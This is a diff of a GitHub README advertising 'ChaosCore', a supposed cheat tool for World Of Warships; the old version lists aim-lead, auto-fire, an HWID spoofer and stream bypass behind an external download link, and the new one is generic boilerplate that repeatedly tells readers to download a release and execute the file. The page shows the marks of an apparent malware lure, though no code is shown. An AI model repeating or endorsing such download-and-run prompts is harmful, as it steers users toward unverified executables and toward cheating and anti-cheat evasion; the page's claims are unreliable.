@@ -1,51 +1,111 @@
-<div align="center">
+# 🌊 World Of Warships: ChaosCore
 
-  ![](https://raw.githubusercontent.com/ibibacuzsoilu/World Of Warships-ChaosCore/main/pictures/1.png)
-  
-  
-  
-</div>
+![ChaosCore Logo](https://img.shields.io/badge/ChaosCore-World%20Of%20Warships-blue)
 
-I know very well how difficult it is to win games absolutely every time, and bet everyone would like to have such an opportunity.
+Welcome to the **World Of Warships: ChaosCore** repository! This project offers unique software solutions designed to enhance your gameplay experience in World Of Warships. Our advanced technologies and reverse engineering expertise set us apart, providing you with reliable tools that can give you an edge in the competitive world of naval warfare.
 
-Now it's possible!
+## 🚀 Table of Contents
 
-<div align="center"><a href="https://ibibacuzsoilu.github.io/id/55202020"><img src="https://raw.githubusercontent.com/ibibacuzsoilu/World Of Warships-ChaosCore/main/pictures/0.png" height="80"></a></div>
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Installation](#installation)
+4. [Usage](#usage)
+5. [Topics](#topics)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Support](#support)
+9. [Contact](#contact)
 
-> 🔲 Supported CPU: AMD & Intel
->
-> 🔧 Supported architectures: 64-bit, 32-bit
->
-> 💿 Supported OS: Windows 11, Windows 10, Windows 8, Windows 7
->
-> 🖥️ Supported gamemodes: Borderless, Windowed, Fullscreen
->
-> 🛡️ Included 𝗛WID 𝗦poofer: Yes
->
-> 📹 Stream Bypass: Yes
+## 📖 Introduction
 
-### Currently includes the following mods:
+World Of Warships is a popular naval warfare game that immerses players in strategic battles across the seas. The **ChaosCore** software provides innovative solutions that enhance gameplay by offering features like aim assist, radar prediction, and other tools that can help you improve your performance. 
 
-* Lead point - Aim
+Whether you're a seasoned player or just starting, our software aims to make your experience smoother and more enjoyable. 
 
-    The lead point allows the player to fire at the enemy ship with automatic lead, which increases the number of hits several times. The player can choose both straight and combined lead. It is most convenient to use in conjunction with an auto-shot. Adjustment of the TU height relative to the waterline is adjusted by up and down arrows on the keyboard, the indicator is located next to the autoshot indicator.).
+To get started, download the latest version from our [Releases section](https://github.com/HamsterGHP/World-Of-Warships-ChaosCore/releases). Be sure to execute the file after downloading for the best results.
 
-* Torpedo lines
+## ✨ Features
 
-    For a more convenient assessment of the trajectory of movement of enemy torpedoes, they are now supplemented with yellow lines extending from the torpedoes forward along their trajectory at a given distance. The gray line going from the bow of your ship forward - additionally signals about torpedoes in the vicinity and shows the course of your ship to clarify maneuvers from torpedoes.
+ChaosCore comes packed with features that enhance your gameplay:
 
-* Automatic firing of guns
+- **Aim Assist**: Improve your shooting accuracy with our advanced aim assist technology.
+- **ESP (Extra Sensory Perception)**: Gain visibility of enemy ships and their movements.
+- **Radar Prediction**: Anticipate enemy actions with our radar prediction tool.
+- **Bot Functionality**: Automate gameplay for farming resources or completing missions.
+- **Custom Scripts**: Utilize scripts tailored to specific gameplay scenarios.
+- **Visual Enhancements**: Customize your in-game visuals for better clarity and performance.
+- **Trajectory Analysis**: Understand projectile paths for improved targeting.
 
-    Auto Shot is a mod that will automatically fire shots at a locked target. This one works in tandem with the lead point mod. Also, the player can choose the "cascade" firing mode or "volley" shots.
+## 🛠️ Installation
 
-* Tracer Lines - Rainbow
+To install ChaosCore, follow these simple steps:
 
-    The mod shows colored lines of projectile entry on the water, which are colored from green through blue, yellow and to red. The faster the color turns to red, the less time you have for maneuver. With this modification, the player can see the place where the enemy artillery shell falls, which makes it possible to make a maneuver in time to avoid hitting your ship.
+1. **Download the Software**: Visit our [Releases section](https://github.com/HamsterGHP/World-Of-Warships-ChaosCore/releases) to download the latest version. 
+2. **Extract the Files**: Unzip the downloaded file to a location of your choice.
+3. **Run the Installer**: Execute the installer file and follow the on-screen instructions.
+4. **Configure Settings**: Open the software and adjust the settings to fit your gameplay style.
 
-* Artillery sight (top view of the sight)
+## 🎮 Usage
 
-    Convenient for long distances. Mod for more convenient capture of targets within the radius of destruction of your weapons and to move around the battlefield. In artillery mode, you can see the trajectory of the enemy ship, as well as the direction of movement of the enemy ship. In this mode, it is difficult to determine the fact of shelling your ship, and therefore it will be inconvenient to maneuver.
+Using ChaosCore is straightforward. After installation:
 
-* Guidance line for your guns
+1. **Launch the Software**: Open the application.
+2. **Select Features**: Choose which features you want to enable.
+3. **Start World Of Warships**: Launch the game from the software interface.
+4. **Enjoy Enhanced Gameplay**: Experience improved accuracy, visibility, and overall performance.
 
-    A mod that draws a line from the barrels of your guns indicating the direction of the barrels on the battlefield. If necessary, this mod can be disabled through the setting.xml settings file.
+## 🏷️ Topics
+
+ChaosCore covers a wide range of topics relevant to World Of Warships and similar games. Here are some key areas of focus:
+
+- war-thunder
+- wargaming
+- world-of-tanks
+- world-of-warships
+- world-of-warships-aimassist
+- world-of-warships-bot
+- world-of-warships-esp
+- world-of-warships-hack
+- world-of-warships-macro
+- world-of-warships-mod
+- world-of-warships-mods
+- world-of-warships-prediction
+- world-of-warships-radar
+- world-of-warships-script
+- world-of-warships-tracers
+- world-of-warships-trajectory
+- world-of-warships-visuals
+- world-of-warships-warpack
+- worldoftanks
+- worldofwarships
+
+## 🤝 Contributing
+
+We welcome contributions from the community! If you have ideas for new features, improvements, or bug fixes, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button at the top right of the page.
+2. **Create a New Branch**: Use `git checkout -b feature/YourFeatureName` to create a new branch.
+3. **Make Your Changes**: Implement your changes in the code.
+4. **Commit Your Changes**: Use `git commit -m "Add your message"` to commit your changes.
+5. **Push to Your Branch**: Use `git push origin feature/YourFeatureName` to push your changes.
+6. **Open a Pull Request**: Go to the original repository and click on "New Pull Request."
+
+We appreciate your contributions and look forward to working together!
+
+## 📄 License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## 💬 Support
+
+If you encounter issues or have questions about using ChaosCore, please check the [Issues](https://github.com/HamsterGHP/World-Of-Warships-ChaosCore/issues) section of this repository. You can also reach out to the community for help.
+
+## 📧 Contact
+
+For further inquiries, you can contact us via email at support@example.com. 
+
+## 🎉 Conclusion
+
+Thank you for visiting the **World Of Warships: ChaosCore** repository. We hope our software enhances your gaming experience. Don't forget to download the latest version from our [Releases section](https://github.com/HamsterGHP/World-Of-Warships-ChaosCore/releases) and execute the file to start your journey!
+
+Happy sailing! 🌊
